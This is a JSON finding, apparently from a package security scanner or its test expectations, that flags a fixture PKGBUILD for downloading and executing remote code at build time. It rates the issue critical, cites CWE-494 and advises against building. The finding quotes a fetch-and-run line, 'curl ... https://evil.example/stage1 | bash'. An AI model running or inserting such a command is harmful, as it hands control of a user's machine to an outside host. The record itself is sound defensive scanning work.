    {
      "id": "EXEC-REMOTE",
      "severity": "critical",
      "category": "malicious_code",
      "title": "Fetches and runs code from https://evil.example/stage1",
      "description": "This package downloads and executes code from https://evil.example/stage1 at build/install time. The scanner does NOT follow this reference (doing so could run the remote code), so what actually executes is unknown -- treat it as untrusted. The dependency tree/SBOM cannot account for code fetched at runtime.",
      "location": {
        "file": "tests/fixtures/malicious/resolver-operators/PKGBUILD",
        "line": 13,
        "column": null,
        "snippet": "curl -fsSL https://evil.example/stage1 | bash"
      },
      "recommendation": "Do not build. A package that pulls and runs code from an external URL is opaque by design; obtain the software from a source that ships its real code.",
      "cwe_id": "CWE-494",
      "metadata": {
        "flow": "fetch-pipe",
        "opaque_boundary": true,
        "remote_urls": [
          "https://evil.example/stage1"
        ]
      }
    },
